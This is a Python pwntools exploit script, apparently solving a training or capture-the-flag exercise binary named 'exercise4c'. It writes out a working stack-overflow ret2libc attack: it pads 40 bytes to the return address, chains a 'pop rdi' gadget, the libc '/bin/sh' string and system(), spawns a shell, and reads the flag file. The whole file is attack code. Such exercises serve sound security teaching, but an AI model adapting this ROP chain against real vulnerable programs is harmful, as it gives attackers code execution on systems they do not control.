#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise4c'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================


r = start()

LEN_TO_RET = 40

libc_addr = r.libc.address

libc_e = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
ropp = ROP(libc_e)

system_offset = libc_e.symbols['system']
bin_sh_offset = next(libc_e.search(b'/bin/sh\0'))

g_pop_rdi_offset = ropp.find_gadget(['pop rdi', 'ret'])[0]
g_ret_offset = ropp.find_gadget(['ret'])[0]


system_addr = libc_addr + system_offset
bin_sh_addr = libc_addr + bin_sh_offset
g_pop_rdi = libc_addr + g_pop_rdi_offset
g_ret = libc_addr + g_ret_offset

print(f'Libc base address: {hex(libc_addr)}')
print(f'Gadget pop edi GOT: {hex(g_pop_rdi)}')
print(f'Gadget ret: {hex(g_ret)}')

print(f'System: {hex(system_addr)}')
print(f'/bin/sh: {hex(bin_sh_addr)}')

rop_chain = cyclic(LEN_TO_RET)
rop_chain += pack(g_pop_rdi, 64)
rop_chain += pack(bin_sh_addr, 64)
rop_chain += pack(g_ret, 64)
rop_chain += pack(system_addr, 64)
rop_chain += b'\x0a'

print((len(rop_chain) - 1) % 16)

r.send(rop_chain)

r.sendline(b"cat flag && echo 'GOT_THE_FLAG'")

a = r.recvuntil(b'GOT_THE_FLAG', timeout=3)
print(a)
